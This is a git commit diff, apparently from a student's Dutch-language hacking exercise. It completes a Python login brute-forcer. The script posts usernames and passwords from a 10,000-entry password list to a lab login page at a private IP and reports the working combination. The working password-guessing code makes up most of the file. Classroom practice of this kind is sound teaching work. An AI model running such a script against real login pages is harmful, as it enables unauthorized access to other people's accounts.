0e496536c2a4c008ace99f22559bddc6be129bf6
Menno <90028503+Menno3650@users.noreply.github.com>
2023-06-05 10:27:58 +0200

    f

--- hfst_7_hacken/_credentialsforcer.py
+++ hfst_7_hacken/_credentialsforcer.py
@@ -1,10 +1,10 @@
 import requests
 
 # Welke webpagina 'forcen'. Opgelet: Dit is niet de inlogpagina zelf.
-URL = "VUL AAN" 
+URL = "http://172.16.1.37:8888/super_login_query.php" 
 
 # Wat is de gebruikersnaam (Moet in lijst staan!)
-users = ["VUL AAN"] # gebruikersnaam bekend? Vul hier aan.
+users = ["administratie"] # gebruikersnaam bekend? Vul hier aan.
 
 """ Is de naam onbekend? Dan kan je dit gebruiken in plaats van bovenstaande.
 with open("10000-common-usernames.txt", "r") as lines:
@@ -12,25 +12,24 @@ with open("10000-common-usernames.txt", "r") as lines:
 """
 
 
-# Wat is het wachtwoord (Moet in lijst staan!)
-passwords = ["VUL AAN"] # Wachtwoord bekend? Vul hier aan.
+# # Wat is het wachtwoord (Moet in lijst staan!)
+# passwords = ["VUL AAN"] # Wachtwoord bekend? Vul hier aan.
 
-""" Is het wachtwoord onbekend? Dan kan je dit gebruiken in plaats van bovenstaande.
-with open("10000-password-seclist.txt", "r") as lines:
+
+with open(r"C:\Users\Menno\OneDrive\Documenten\GitHub\6IICT_PROG4_oef\hfst_7_hacken\10000-password-seclist.txt", "r") as lines:
     passwords = [line.strip() for line in lines]
-"""
+
 
 # Overloop alle opties.
 for user in users:
     for password in passwords:
         # Zet data klaar om te posten
-        data = "VUL AAN"
-
+        data = {'admin_id':user, 'password':password, "super_login":'submit'}
         # Verzend POST request
         response = requests.post(URL, data=data)
 
         # Controleer of login geslaagd is (OBV inhoud webpagina)
-        if "VUL AAN" in response.text:
+        if "Incorrect" in response.text:
             print(f"Incorrecte Combinatie. Naam:{user} Wachtwoord:{password}.")
         else:
             print(f"Je bent binnen! Naam:{user} Wachtwoord:{password}")
